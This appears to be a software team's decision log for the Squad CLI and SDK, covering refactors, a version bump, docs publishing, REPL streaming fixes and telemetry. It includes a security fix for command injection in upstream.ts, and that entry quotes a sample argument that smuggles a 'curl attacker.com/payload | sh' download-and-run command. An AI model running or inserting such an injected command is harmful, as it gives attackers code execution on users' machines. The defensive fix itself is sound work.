| `agents/model-selector.ts` | Removed local `FALLBACK_CHAINS`, `DEFAULT_MODEL`, `DEFAULT_TIER`; imports from constants |
| `runtime/config.ts` | `DEFAULT_CONFIG` uses `MODELS.*`; `AgentRole` re-exported from constants |
| `runtime/health.ts` | Default timeout uses `TIMEOUTS.HEALTH_CHECK_MS` |
| `config/init.ts` | Template generators use `MODELS.*` for all model values |
| `cli/commands/plugin.ts` | Browse timeout uses `TIMEOUTS.PLUGIN_FETCH_MS` |
| `index.ts` | Named exports: `MODELS`, `TIMEOUTS`, `AGENT_ROLES` |
| `package.json` | Added `./runtime/constants` subpath export |

**Not touched:** `upstream.ts` (Baer owns), `benchmarks.ts` (synthetic simulation data, not config).

## Rationale

- `as const` gives literal types + `readonly` — prevents accidental mutation
- Environment variable overrides enable runtime configuration without code changes
- Named exports (not `export *`) from barrel avoid `AgentRole` collision with casting module's different `AgentRole` type
- Spreading `[...MODELS.FALLBACK_CHAINS.tier]` converts readonly tuples to mutable arrays for interface compatibility

## Verification

- Build: zero TypeScript errors
- Tests: 2138/2141 passed (3 failures are pre-existing Docker/Aspire infrastructure tests)


# Decision: Fix CWE-78 Command Injection in upstream.ts

**Date:** 2026-02-22
**Author:** Baer (Security)
**Requested by:** Brady
**Status:** IMPLEMENTED

## Context

Security audit of `packages/squad-cli/src/cli/commands/upstream.ts` identified 3 CWE-78 (OS Command Injection) vulnerabilities. All three used `execSync` with string interpolation, allowing shell metacharacters in user-supplied `--ref`, `--name`, and source arguments to execute arbitrary commands.

**Attack example:** `squad upstream add https://repo --ref "main && curl attacker.com/payload | sh"`

## Changes Made

1. **Replaced `execSync` → `execFileSync` with array arguments** (3 call sites: add-clone, sync-pull, sync-clone). `execFileSync` bypasses the shell entirely — arguments are passed directly to the `git` binary.

2. **Added input validation functions:**
   - `isValidGitRef(ref)` — allows only `[a-zA-Z0-9._\-/]+`
   - `isValidUpstreamName(name)` — allows only `[a-zA-Z0-9._-]+`
   - Both reject shell metacharacters (`&`, `|`, `;`, backticks, `$`, etc.)

3. **Fixed `fatal` import:** Changed from `error as fatal` (output.js — prints but continues) to real `fatal` (errors.js — throws SquadError, exits). Usage-error paths now properly halt execution.

## Verification

- `npm run build` — passes (0 errors)
- `npm test` — 74 test files, 2022 tests passed

## Risk Assessment

- **Before:** Critical — unauthenticated RCE via CLI argument injection
- **After:** Mitigated — defense in depth (no shell + input validation)

## Kobayashi Decision: Version Alignment Release 0.8.2 (2026-02-22)

**Status:** ✅ EXECUTED  
**Decided by:** Kobayashi (Git & Release engineer)  
**Requested by:** Brady  
**Context:** Independent feature development caused version drift. Explicit alignment required to unblock publish workflows and establish clear release checkpoint.

### Problem

Three package.json files at different versions:
- Root: 0.6.0-alpha.0
- SDK: 0.8.0
- CLI: 0.8.1

This skew required nuanced tag management and left CI/CD workflows (squad-publish.yml, squad-release.yml) in ambiguous state. Stable release required canonical version.

### Decision

Synchronize all three versions to **0.8.2** and create release tag v0.8.2:
1. Update root `package.json`: 0.6.0-alpha.0 → 0.8.2
2. Update SDK `package.json`: 0.8.0 → 0.8.2
3. Update CLI `package.json`: 0.8.1 → 0.8.2
4. Regenerate package-lock.json via `npm install --package-lock-only`
5. Commit: `chore: align CLI and SDK versions to 0.8.2` (with Copilot co-author trailer)
6. Create tag: v0.8.2 (pushed to origin)
7. Create GitHub Release with version history notes

### Execution

- **Commit:** db5d621 on bradygaster/dev
- **Tag:** v0.8.2 (pushed to origin/v0.8.2)
- **Release:** https://github.com/bradygaster/squad-pr/releases/tag/v0.8.2

### Impact

- ✅ squad-publish.yml now triggers on v* tags → publishes both packages to npm
- ✅ squad-release.yml can validate version consistency across workspace
- ✅ Clear release checkpoint: all packages at 0.8.2
- ✅ CI/CD pipeline unblocked

### Future Versioning

Independent versioning via changesets remains correct between releases. CLI and SDK can evolve at different cadences, tracked in separate changeset files per decision #208. Version alignment at release boundaries is the pattern.

### Precedent

Earlier decision (2026-02-21, Kobayashi) stated that SDK 0.8.0 and CLI 0.8.1 skew was "intentional and appropriate for pre-1.0 development." That decision is superseded by this explicit release checkpoint decision. The skew served its purpose during development; now the workspace synchronizes for v0.8.2 release.


### 2026-02-23T02:01:23Z: User directive
**By:** Brady (via Copilot)
**What:** Never use / or \ as code fences in GitHub issues, PRs, or comments. Only use backticks to format code. Slashes break GitHub markdown rendering.
**Why:** User request — captured for team memory

# Decision: squad doctor command — diagnostic conventions

**Date:** 2026-02-22
**By:** Edie
**Issue:** #312
**Status:** Implemented

## What

`squad doctor` is a diagnostic CLI command that validates .squad/ setup integrity. It always exits 0 — it reports problems, never gates on them.

## Key conventions

1. **DoctorCheck interface** — `{ name, status: 'pass' | 'fail' | 'warn', message }` — the typed contract for every check result.
2. **Mode detection order** — config.json `teamRoot` → remote; `squad-hub.json` → hub; else → local.
3. **Exit code always 0** — doctor is informational. `fatal()` is never used for check failures.
4. **Lazy import in cli-entry.ts** — follows the established pattern (`await import('./cli/commands/doctor.js')`).
5. **Subpath export** — `./commands/doctor` in CLI package.json with types-first condition ordering.

## Why

Inspired by Shayne Boyer's PR #131. Teams need a quick way to validate their .squad/ directory without running a full session. The diagnostic-not-gate pattern means CI can call it without risk.

# Decision: Dual-root ensureSquadPath write validation (#314)

**Date:** 2026-02-23  
**Author:** Edie  
**Issue:** #314  
**Depends on:** #311 (dual-root resolver)  
**Status:** Implemented

## Context

`ensureSquadPath()` validates that file writes stay inside a single `.squad/` root. In remote mode (introduced by #311), there are two valid write roots: `projectDir` (decisions, logs) and `teamDir` (agents, casting, skills). Writes to `teamDir` throw because it's outside the single `squadRoot`.

## Decision

Added two new functions in `packages/squad-sdk/src/resolution.ts` alongside the existing `ensureSquadPath()`:

- **`ensureSquadPathDual(filePath, projectDir, teamDir)`** — validates against both roots plus the system temp directory. Same `path.resolve` + `path.sep` prefix-checking pattern as the original.
- **`ensureSquadPathResolved(filePath, paths)`** — convenience wrapper that destructures a `ResolvedSquadPaths` object (from #311's `resolveSquadPaths()`).

### Backward compatibility

- `ensureSquadPath()` is **unchanged** — no modifications to existing callers.
- New functions are additive exports only.

### Error messages

Changed from "outside the .squad/ directory" to "outside both squad roots" so callers see both paths in the error.

## Tests

13 tests in `test/ensure-squad-path-dual.test.ts`:
- Local mode (single root), remote mode (both roots), rejection, path traversal, subdirectories, exact roots, temp dir, `ResolvedSquadPaths` wrapper.

# Decision: Eliminate unsafe casts in adapter layer

**By:** Edie
**Date:** 2026-02-23
**Closes:** #318, #320, #321, #322

## Context

The adapter layer (`packages/squad-sdk/src/adapter/client.ts`) had multiple type-safety gaps:

1. `listSessions()` used `as unknown as SquadSessionMetadata[]` — passing SDK data through without runtime mapping
2. `getStatus()`, `getAuthStatus()`, `listModels()` returned SDK results directly, relying on implicit `any`-to-typed coercion
3. `SquadClient.on()` used `as any` casts to bridge SDK and Squad event handler types
4. `SquadClientWithPool.on()` was fully untyped `(any, any)`
5. Dead `_squadOnMessage` reference in `sendMessage()` — never set, never used
6. `CopilotSessionAdapter` lacked `sendAndWait()`, `abort()`, `getMessages()` — SDK methods with no adapter surface

## Decision

### Field-mapping over unsafe casts (#318)

All SDK-to-Squad data boundaries now use explicit field-picking:

```typescript
const sessions = await this.client.listSessions();
return sessions.map((s): SquadSessionMetadata => ({
  sessionId: s.sessionId,
  startTime: s.startTime,
  ...
}));
```

This catches SDK type drift at compile time. Applied to `listSessions()`, `getStatus()`, `getAuthStatus()`, `listModels()`.

### Client event types (#321)

Created `SquadClientEventType`, `SquadClientEvent`, `SquadClientEventHandler` in `adapter/types.ts` — distinct from session-level event types. These mirror the SDK's `SessionLifecycleEventType` union (`session.created | session.deleted | session.updated | session.foreground | session.background`). Structural compatibility with the SDK means zero `as any` casts at the boundary.

Pool events in `SquadClientWithPool` now use a typed mapping (`poolToSquadEvent`) instead of `as any`.

### Adapter completeness (#322)

Added `sendAndWait()`, `abort()`, `getMessages()` as optional methods on `SquadSession` interface and implemented them in `CopilotSessionAdapter`. Removed dead `_squadOnMessage` reference. Fixed `(event as any).inputTokens` with typed index access via `SquadSessionEvent`'s `[key: string]: unknown` signature.

### resumeSession() already correct (#320)

Verified: `resumeSession()` already wraps in `CopilotSessionAdapter`. No change needed.

## Result

- Zero `as any` or `as unknown as` casts remain in `adapter/client.ts` and `client/index.ts`
- 2219 tests pass, zero regressions
- Build clean under `strict: true`

# Decision: Dual-root path resolution (projectDir / teamDir)

**Date:** 2026-02-23  
**Author:** Fenster  
**Issue:** #311  
**Status:** Implemented

## Context

Remote squad mode requires separating project-local state (decisions, logs) from team identity assets (agents, casting, skills). A project's `.squad/config.json` can now point to an external team directory via a relative `teamRoot` path.

## Decision

Added `resolveSquadPaths()` alongside the existing `resolveSquad()` in `packages/squad-sdk/src/resolution.ts`.

### Types

- **`SquadDirConfig`** — schema for `.squad/config.json` (`version: number`, `teamRoot: string`, `projectKey: string | null`). Named `SquadDirConfig` to avoid collision with the existing `SquadConfig` type in `config/schema.ts` and `runtime/config.ts`.
- **`ResolvedSquadPaths`** — `{ mode, projectDir, teamDir, config, name, isLegacy }`.

### Resolution rules

1. Walk up from startDir checking `.squad/` then `.ai-team/` (legacy fallback).
2. If `.squad/config.json` exists with a valid `teamRoot` string → **remote mode**: `teamDir = path.resolve(projectRoot, config.teamRoot)` where projectRoot is the parent of the `.squad/` directory.
3. Otherwise → **local mode**: `projectDir === teamDir`.
4. Malformed JSON or missing/invalid `teamRoot` → graceful fallback to local mode.

### Backward compatibility

- `resolveSquad()` is unchanged — returns `string | null` as before.
- `resolveSquadPaths()` is a new, additive export.
- No existing tests or callers affected.

## Constraints

- ESM-only, strict TypeScript.
- Uses `node:fs` and `node:path` — no string concatenation for path building.
- No symlinks — config.json with relative paths only.
- `teamRoot` resolved relative to the project root, not relative to `.squad/`.

# Decision: Adapter Event Name Mapping and Data Normalization

**Date:** 2026-02-22  
**By:** Fenster (Core Dev)  
**Issues:** #316, #317, #319  
**Status:** Implemented

## Context

The `CopilotSessionAdapter` in `packages/squad-sdk/src/adapter/client.ts` mapped methods (`sendMessage` → `send`, `close` → `destroy`) but did NOT map event names or event data shapes. The `@github/copilot-sdk` uses dotted-namespace event types (e.g., `assistant.message_delta`, `assistant.usage`) and wraps payloads in an `event.data` envelope. Our adapter passed short names like `message_delta` and `usage` directly through, causing handlers to silently never fire. The OTel telemetry in `sendMessage()` was therefore dead code — `first_token` never recorded, `tokens.input`/`tokens.output` never populated.

## Decision

1. **Event name mapping via `EVENT_MAP`**: A static `Record<string, string>` maps 10 Squad short names to SDK dotted names. The reverse map is computed automatically. Unknown names pass through unchanged, so callers CAN use the full SDK name directly if they prefer.

2. **Event data normalization via `normalizeEvent()`**: The adapter wraps every handler to flatten `event.data` onto the top-level `SquadSessionEvent` and maps the type back to the Squad short name. This means callers access `event.inputTokens` (not `event.data.inputTokens`) and check `event.type === 'usage'` (not `event.type === 'assistant.usage'`).

3. **Per-event-type unsubscribe tracking**: Changed `unsubscribers` from `Map<handler, unsubscribe>` to `Map<handler, Map<eventType, unsubscribe>>` so the same handler function can be subscribed to multiple event types without the second `on()` overwriting the first's unsubscribe function.

## Alternatives Considered

- **No mapping layer (callers use SDK names directly):** Rejected — breaks the adapter's purpose of decoupling Squad from SDK internals. Also requires changing all callers (violates constraint).
- **Transform at dispatch instead of subscribe:** Would require intercepting `_dispatchEvent` on the inner session, which is fragile and relies on SDK internals.

## Impact

- Zero changes to callers — the adapter normalizes everything transparently
- Zero changes to `SquadSession` interface or `SquadSessionEventType`
- OTel stream tracking now works end-to-end through the adapter
- Future SDK event name changes only require updating `EVENT_MAP`


### 2026-02-23: GitHub Pages publishing architecture (consolidated)
**By:** Keaton (Lead), Fenster (Core Dev), McManus (DevRel)
**Date:** 2026-02-23  
**Status:** Ready for implementation
**Related:** Keaton analysis (architecture), Fenster plan (build tooling), McManus recommendation (content structure)

## What

Establish GitHub Pages publishing for squad-pr documentation and blog, building on team research into the old repo (bradygaster/squad) and current squad-pr infrastructure.

### Three complementary decisions:

1. **Architecture (Keaton):** Ship with current setup — no changes needed. Squad-PR's docs infrastructure is production-ready and lighter than the old repo.
   - Use existing .github/workflows/squad-docs.yml (identical to old repo, already configured)
   - Use docs/build.js (lightweight, ESM-native, zero npm deps)
   - Use docs/guide/ markdown files (8 guides ready to publish, plus 1 audit document)
   - Defer blog support to future wave

2. **Build & Deploy (Fenster):** Upgrade markdown library and establish deployment workflow.
   - Add markdown-it + markdown-it-anchor as devDependencies (better HTML output, syntax highlighting, auto-generated anchor IDs)
   - Refactor docs/build.js (~10-15 lines) to use markdown-it
   - Add npm script: "docs": "node docs/build.js --out dist/docs"
   - Create .github/workflows/pages-deploy.yml (trigger: push to main with paths filter on docs/**, plus workflow_dispatch)
   - Add --base CLI argument support for subpath deployment (recommend --base /squad-pr)
   - Configure GitHub Pages in repo settings (deployment source: GitHub Actions)

3. **Content (McManus):** Publish existing guides + audits; recreate blog with fresh v1 content.
   - Publish /docs/guide/ (14 guides, all sections: Getting Started, Core, Reference, Troubleshooting) — Ready as-is
   - Publish /docs/audits/ (technical transparency builds trust)
   - Keep /docs/launch/ internal only (release notes canonical in CHANGELOG.md per v1 internal-only docs decision)
   - Recreate /docs/blog/ with new v1-specific content (fresh origin story, team integration guides, community wins, feature launches)
   - Do NOT reuse old beta blog posts (different narrative arc: beta "building while building" vs. v1 "proven runtime, production integrations")
   - Blog naming: YYYY-MM-DD-slug.md (searchable, SEO-friendly)
   - Blog YAML frontmatter: title, date, author, tags (releases, features, learnings, community), status

## Why

**Architecture:** Squad-PR's build.js is proven, self-contained, and aligns with ESM-only constraint. Old repo's markdown-it approach adds overhead for features not yet needed. Lightweight approach is maintainable.

**Build & Deploy:** Markdown-it upgrade improves output quality (syntax highlighting, tables, anchor links). npm script + workflow = standardized dev workflow + CI/CD integration. Base path support enables subpath hosting.

**Content:** Three-part strategy respects both product decisions (internal-only docs) and DevRel goals (community, transparency, ownership of v1 milestone). Fresh blog avoids confusing new users about version boundaries. Keeps old beta blog as authentic historical artifact.

## How

1. **Immediate (Keaton validation):**
   - Test local build: 
ode docs/build.js
   - Verify output in docs/dist/
   - Enable GitHub Pages in repo settings (if not already done)
   - Verify deployment to https://bradygaster.github.io/squad-pr/

2. **Build phase (Fenster implementation):**
   - Add markdown-it + markdown-it-anchor to package.json devDeps
   - Refactor docs/build.js to use markdown-it converter
   - Add npm script "docs"
   - Create pages-deploy.yml workflow
   - Add --base CLI argument support
   - Test locally with 
pm run docs
   - Test workflow with push to feature branch

3. **Content phase (McManus guidance):**
   - Determine v1 blog cadence (start with v1.0.0 launch or earlier?)
   - Draft first blog posts (origin story, team integration guide)
   - Set up navigation structure per McManus recommendation
   - Review SEO requirements (if any)

## Timeline

- **Now:** Research complete. Decisions ready for team alignment.
- **Week 1:** Fenster implements build tooling + workflow
- **Week 2:** McManus drafts first blog posts
- **Week 3:** Full site tested, Pages deployed live

## Impact

- Zero breaking changes to existing codebase
- Docs publishing operational end-to-end
- Blog infrastructure ready for v1 narrative
- Team has clear content ownership (McManus) and technical ownership (Fenster)

## Notes

- If markdown-it needs additional plugins (tables, admonitions) in future, it's a simple addition to build.js
- Old repo's workflow pattern (squad-docs.yml) is proven; pages-deploy.yml follows same pattern
- Blog support can iterate independently of docs — no dependency between phases
- Relative asset paths in HTML ensure both local and GitHub Pages deployments work without reconfiguration

# Decision: Remote Squad Mode Awareness in Coordinator Prompt

**Date:** 2025-07-18
**Author:** Verbal
**Related:** #313

## Context

The SDK is adding remote squad mode — where team identity files (agents, casting, skills) live in an external repository and project-scoped files (decisions, logs) stay local. The coordinator prompt (`squad.agent.md`) needed to know about this third resolution strategy so it can correctly resolve paths and pass them to spawned agents.

## Decision

1. Added remote squad mode as a third strategy in the Worktree Awareness section, after worktree-local and main-checkout.
2. Introduced `PROJECT_ROOT` as a second variable in spawn templates. `TEAM_ROOT` points to team identity; `PROJECT_ROOT` points to project-local `.squad/`. In local mode they're identical.
3. Added @copilot incompatibility note — remote mode requires filesystem traversal that the GitHub Copilot coding agent cannot perform.

## Rationale

- The coordinator is the single point of path resolution. If it doesn't know about remote mode, no spawned agent will get correct paths.
- Two variables (`TEAM_ROOT` + `PROJECT_ROOT`) keep the split explicit rather than requiring agents to parse config.json themselves.
- The @copilot note prevents confusion when users try to assign remote-mode work to the coding agent.


# 2026-02-23: sendMessage REPL Bug — Fixed via SDK Version Pin + Test Suite

**By:** Fenster, Hockney, Kujan  
**Date:** 2026-02-23  
**Status:** ✅ Complete (SDK pinned, tests added, audit complete)  
**Issues:** REPL `sendMessage is not a function` error

## Context

Brady reported that the REPL in `@bradygaster/squad-cli@0.8.2` throws `coordinatorSession.sendMessage is not a function`. The CLI imports `SquadClient` and creates sessions via `client.createSession()`, wrapped by `CopilotSessionAdapter` to map `sendMessage()` → `send()`. The error indicated raw SDK sessions leaking through.

## Root Cause

The CLI's `package.json` had `"@bradygaster/squad-sdk": "*"` which resolves to any available version in production. An older SDK version lacking `CopilotSessionAdapter` wrapping caused the mismatch.

## Decision: Pin SDK version to 0.8.2

```json
"@bradygaster/squad-sdk": "0.8.2"
```

Both packages versioned at 0.8.2 and published together as a matched set. Exact pin ensures production installs get the correct SDK version while workspace development resolves to local packages. Breaking changes in SDK now require coordinated CLI version bumps.

**Alternative considered & rejected:** Caret range `^0.8.0` would allow patch/minor mismatches that could break compatibility.

## Verification

- **Tests:** Hockney created 110 new comprehensive tests in `test/cli-shell-comprehensive.test.ts` covering all 9 shell modules (coordinator, spawn, lifecycle, router, sessions, commands, memory, autocomplete, sendMessage validation). All 110 passing.
- **Audit:** Kujan audited the full adapter chain. Confirmed `CopilotSessionAdapter` correctly maps `sendMessage` → `send`. Identified that published 0.8.2 npm package has the old unsafe cast, but the fix exists in current codebase (not yet published).

## Impact

- ✅ sendMessage operations now functional in REPL
- ✅ Full shell infrastructure tested (110 new tests)
- ✅ Known issue: published npm 0.8.2 has unsafe cast (current codebase fix pending publish)
- ✅ Version alignment enables reliable production deployments

# 2026-02-23: User Directive — Docs Overhaul & Publication Pause (consolidated)

**By:** Brady (via Copilot)  
**Date:** 2026-02-23  
**Status:** Active — awaiting Brady sign-off before docs publication

## What

1. **Pause docs publication:** Do not publish docs live until Brady explicitly gives go-ahead. Build locally only.
2. **Docs redesign directives:**
   - Trim down — remove old beta-era folder references
   - Tone: lighthearted, welcoming, fun (NOT stuffy; match original Squad voice)
   - First doc should be "first experience" with squad CLI (NOT deep tech dive)
   - Reference docs (CLI, SDK, config) in single TOC section
   - All docs: brief, prompt-first, action-oriented, fun
   - Human tone throughout

## Why

User request — captured for team memory. Brady wants docs that feel like original beta content, not enterprise documentation. Publication freeze prevents premature rollout while redesign is underway.

### 2026-02-23: Use sendAndWait for streaming dispatch
**By:** Kovash (REPL Expert)
**Date:** 2026-02-23
**Scope:** Shell dispatch pipeline (`packages/squad-cli/src/cli/shell/index.ts`)

## What

Both `dispatchToAgent()` and `dispatchToCoordinator()` now use `sendAndWait()` instead of `sendMessage()` to wait for the full streamed response before proceeding. A fallback path listens for `turn_end`/`idle` events if `sendAndWait` is unavailable.

## Why

`sendMessage()` wraps the SDK's `send()` which is fire-and-forget — it resolves immediately, before any streaming deltas arrive. This caused the coordinator prompt to be parsed against an empty `accumulated` string, producing "coordinator:" with no content.

## Pattern

```typescript
async function awaitStreamedResponse(session, prompt) {
  if (session.sendAndWait) {
    await session.sendAndWait({ prompt }, 120_000);
  } else {
    // fallback: wait for turn_end or idle event
  }
}
```

The `message_delta` listener is kept for progressive UI updates; `awaitStreamedResponse` only gates when we proceed to parse.

## Impact

All agents must use `awaitStreamedResponse` (or equivalent) when they need the full response text. Never parse `accumulated` after a bare `sendMessage()`.

## Tested

Created `test/repl-streaming.test.ts` (13 tests). All 2351 tests pass.




# Decision: SQUAD_DEBUG Diagnostic Logging for REPL Streaming

**Date:** 2026-02-23
**Author:** Kovash (REPL & Interactive Shell)
**Status:** Implemented

## Context

Brady reported the REPL is still broken after the `deltaContent` fix — empty coordinator responses, no streaming content visible. The compiled output was verified correct. Without runtime visibility, we cannot determine if: (a) delta events never fire, (b) `sendAndWait` returns `undefined`, (c) handler errors are silently swallowed by the SDK, or (d) the session isn't actually in streaming mode.

## Decision

Added `SQUAD_DEBUG=1` environment variable gating for diagnostic `console.error()` calls at every critical point in the streaming pipeline. Logs go to stderr to avoid interfering with Ink rendering.

### Logging points:
- `dispatchToCoordinator` entry (message being sent)
- `dispatchToAgent` entry (agent name + message)
- `onDelta` fire (event type)
- `extractDelta` (event keys, whether `deltaContent` exists, extracted value)
- `awaitStreamedResponse` (sendAndWait result type, keys, has data)
- Accumulated vs fallback lengths after sendAndWait resolves
- `parseCoordinatorResponse` decision type

### Infrastructure:
- `.env` file at repo root with `SQUAD_DEBUG=1`
- Lightweight `.env` parser in `cli-entry.ts` (no `dotenv` dependency)
- VS Code launch.json `envFile` property for both REPL configurations

## Key SDK Findings

The `@github/copilot-sdk` `_dispatchEvent` method wraps every handler call in `try/catch` with empty catch blocks. If our `normalizeEvent` or delta handler throws, the error is silently swallowed. The SQUAD_DEBUG logging will expose whether handlers are being called at all.

## Next Steps

Brady should run with `SQUAD_DEBUG=1` and share the stderr output. The logs will tell us exactly where the pipeline breaks down.


# Streaming Bug Report — Hockney

**Filed by:** Hockney (Tester)
**Date:** 2026-02-22

## Bug 1: Empty coordinator response — the "silent swallow"

**Symptom:** Brady sees empty coordinator responses in REPL.

**Root cause chain:**
1. `awaitStreamedResponse()` calls `session.sendAndWait()` which may return `undefined` (no `data.content` fallback)
2. If the SDK also emits zero `message_delta` events (network issue, timeout, model quirk), `accumulated` stays empty
3. `dispatchToCoordinator` hits `if (!accumulated && fallback)` — but fallback is also empty string
4. `parseCoordinatorResponse('')` returns `{ type: 'direct', directAnswer: '' }` — empty direct answer
5. The shell shows this empty string as the coordinator's response with no error, no warning, no retry

**Why this is bad:** The pipeline treats "got nothing" the same as "answered with nothing." There's no distinction between a successful empty response and a total failure to get any response.

**Fix recommendation:**
- After `awaitStreamedResponse`, if accumulated is empty string AND fallback is empty, throw or warn — don't silently proceed
- Or: add a minimum-length check on coordinator responses before parsing
- Related: the `extractDelta` fix was necessary but not sufficient — the fallback path also needs to actually produce content

## Bug 2: Test helper `simulateDispatch` didn't replicate fallback

**What:** The existing `simulateDispatch()` test helper ignores the return value of `sendAndWait()`. The real `awaitStreamedResponse()` extracts `result.data.content` as a fallback. This means tests were only exercising the delta path, never the fallback path. Added `simulateDispatchWithFallback` to cover this gap.

## Gap: No SQUAD_DEBUG diagnostic logging

**What:** There is no `SQUAD_DEBUG` env var or any diagnostic logging in the dispatch pipeline. When streaming silently fails, there's zero visibility into what happened. Marked as `it.todo()` in tests. Recommend implementing debug logging on the dispatch path to help diagnose future streaming issues.


# Decision: extractDelta field priority — deltaContent first

**Author:** Kovash (REPL & Interactive Shell Expert)
**Date:** 2026-02-23
**Status:** Implemented

## Context

The `@github/copilot-sdk` `assistant.message_delta` event uses `deltaContent` as the field name for streamed text chunks. After `normalizeEvent()` spreads `sdkEvent.data` onto the top-level event object, the field name is `deltaContent` — not `delta` or `content`.

The old `extractDelta()` checked only `delta` and `content`, silently returning `''` for every delta event, causing blank "coordinator:" responses in the shell.

## Decision

1. **extractDelta priority:** `deltaContent` > `delta` > `content` — matches SDK actual format while preserving backward compat.
2. **awaitStreamedResponse returns fallback:** The `sendAndWait` return value (`result.data.content`) is now captured and returned as a fallback string. Both dispatch functions use it if delta accumulation is empty.
3. **Tests updated:** All mock sessions and `simulateDispatch` now use `deltaContent`. Added legacy `delta` key test for backward compat coverage.

### 2026-02-24: Ghost Command Aliasing Strategy
**By:** Fenster (Core Dev)
**Closes:** #501, #503, #504, #507, #509
**What:** Five undocumented commands now wire as aliases: `hire` → `init`, `heartbeat` → `doctor`, `shell` → explicit `runShell()`, `loop` → `triage`, `run` → stub with "coming soon".
**Why:** Minimal code change (1-2 lines per alias). All alias targets are existing implementations. `run` deferred pending session lifecycle changes. Backwards compatible.
**Impact:** CLI help updated. Users can now use documented command names. `squad run` will need real implementation in future PR.

### Per-command --help/-h: intercept-before-dispatch pattern
**By:** Fenster (Core Dev)
**Date:** 2026-02-14
**PR:** #533
**Closes:** #511, #512
**What:** All CLI subcommands support `--help` and `-h` flags. Help is intercepted before command routing, preventing destructive commands from executing.
**Why:** Safety issue — users expect `--help` to be non-destructive. Intercept-before-dispatch guarantees no side effects.
**Convention:** New CLI commands MUST have a `getCommandHelp()` entry with usage, 1-2 sentence description, options, and 2+ examples.

### 2026-02-25: REPL cancellation and configurable timeout
**By:** Kovash (REPL & Interactive Shell Expert)
**PR:** #538
**Closes:** #500, #502
**What:** (1) Ctrl+C immediately resets `processing` state so InputPrompt re-enables instantly. (2) Timeout config uses `SQUAD_REPL_TIMEOUT` env var (seconds); precedence: `SQUAD_REPL_TIMEOUT` → `SQUAD_SESSION_TIMEOUT_MS` (SDK-level, ms) → 600000ms default. CLI `--timeout` flag sets env var before shell launch.
**Why:** Ctrl+C was leaving shell locked. Timeout was hardcoded and not user-configurable. Env var precedence allows flexible override.
**Impact:** Shell components (InputPrompt, ThinkingIndicator) affected. CLI entry point gains `--timeout` flag. SDK unchanged (fallback preserved).

### 2026-02-24: Shell Observability Metrics Design
**By:** Saul (Aspire & Observability)
**Closes:** #508, #520, #526, #530, #531
**What:** Four new metrics under `squad.shell.*` namespace: `session_count` (counter), `session_duration_ms` (histogram), `agent_response_latency_ms` (histogram from first visible token), `error_count` (counter). All gated behind `SQUAD_TELEMETRY=1` (stronger privacy guarantee than SDK-level metrics).
**Why:** User-facing shell metrics describe behavior patterns and require explicit consent. Separate gate stronger than just OTLP endpoint activation.
**Architecture:** New module `packages/squad-cli/src/cli/shell/shell-metrics.ts` uses `getMeter('squad-shell')` from SDK, wired into `runShell()` lifecycle. No PII collected.
**Impact:** 18 new tests. Zero impact when `SQUAD_TELEMETRY` unset. Compatible with Aspire dashboard.

## Impact

- Fixes blank coordinator/agent responses in the REPL shell.
- All 29 streaming tests pass. Full suite (2362 tests) unaffected.
- Team members working on SDK event handling should use `deltaContent` as the canonical field name.


# Decision: Wire OpenTelemetry into the REPL shell startup

**Author:** Kovash (Copilot SDK Expert / Backend Dev)
**Date:** 2026-02-23
**Status:** Implemented

## Context

Brady has the Aspire dashboard running in Docker (port 4317 reachable), but the REPL launched via `squad` produced no telemetry. Root cause: `runShell()` never called `initSquadTelemetry()` even though the SDK had everything ready.

## Decision

1. **`runShell()` now initializes OTel** — calls `initSquadTelemetry({ serviceName: 'squad-cli' })` early in the function, before lifecycle init. Telemetry handle is shut down in the cleanup block alongside sessions and lifecycle.

2. **Telemetry status message uses `console.error`** — not `renderer.info()` (which doesn't exist on ShellRenderer) and not `console.log` (which would interfere with Ink rendering). The `🔭 Telemetry active` message goes to stderr.

3. **VS Code launch configs get the env var** — `OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4317` added to "Squad REPL" and "Squad REPL (rebuild first)" in `.vscode/launch.json`. Not added to npm scripts to avoid polluting all terminal sessions.

4. **Resilience hardened** — `_sdk.start()` in `otel.ts` wrapped in try/catch so gRPC connection failures are non-fatal. The SDK's gRPC exporters already silently retry on connection refused, but this guards against synchronous startup exceptions.

## Consequences

- When `OTEL_EXPORTER_OTLP_ENDPOINT` is set and Aspire is running, traces and metrics flow automatically.
- When the env var is unset or the endpoint is unreachable, everything remains a no-op — zero impact on normal REPL usage.
- F5 debugging in VS Code automatically targets the local Aspire dashboard.


# Decision: Switch OTel exporters from HTTP to gRPC

**Author:** Saul (Aspire & Observability)  
**Date:** 2026-02-XX  
**Status:** Implemented  

## Context

Brady reported that no telemetry appeared in the Aspire dashboard despite the container running and `OTEL_EXPORTER_OTLP_ENDPOINT` being set.

## Root Cause

Three compounding bugs:

1. **Protocol mismatch** — `otel.ts` used `@opentelemetry/exporter-trace-otlp-http` (OTLP/HTTP), but Aspire only accepts OTLP/gRPC on port 18889. HTTP exports to a gRPC port fail silently.
2. **Wrong endpoint constant** — `aspire.ts` set `OTEL_EXPORTER_OTLP_ENDPOINT` to `http://localhost:18888` (the dashboard UI), not `http://localhost:4317` (host-mapped OTLP gRPC port).
3. **OTLP auth mode = ApiKey** — Docker launched Aspire with `DASHBOARD__OTLP__AUTHMODE=ApiKey` but the SDK never sent an API key. Connections were rejected.

## Decision

- Switch SDK exporters to gRPC (`exporter-trace-otlp-grpc`, `exporter-metrics-otlp-grpc`). The gRPC packages were already in the dependency tree transitively via `@opentelemetry/sdk-node`.
- Fix the `ASPIRE_OTLP_ENDPOINT` constant to `http://localhost:4317`.
- Set OTLP auth mode to `Unsecured` for local dev Docker launches.
- Update docs with correct env vars and a Quick Debug Checklist.

## Impact

- All OTel telemetry (traces + metrics) will now reach the Aspire dashboard when `OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4317` is set.
- No breaking change for SDK consumers who don't use OTel (everything remains opt-in/no-op).
- The gRPC dependency is already present; no new packages added to the tree.


# Decision: Personal Squad Tutorial Added to Guide Section

**Date:** 2026-02-23
**Author:** McManus (DevRel)
**Requested by:** Brady

## What

Created `docs/guide/personal-squad.md` — a flagship end-to-end tutorial on setting up and using a personal squad. Added to the Guide section in docs/build.js SECTION_ORDER.

## Why

Brady's directive: write the tutorial on personal squads. This is the first user-facing documentation for `squad init --global` and the remote mode resolution system. The feature existed in code (resolution.ts, cli-entry.ts) but had no dedicated tutorial.

## Decisions Made

1. **Tone:** Matched existing docs exactly (first-session.md as gold standard). No hype. "It's still very new" energy throughout.
2. **Behind the scenes depth:** Explained the config.json teamRoot pointer, local vs. remote mode split, and resolution algorithm — enough to understand what's happening, not enough to be a reference doc.
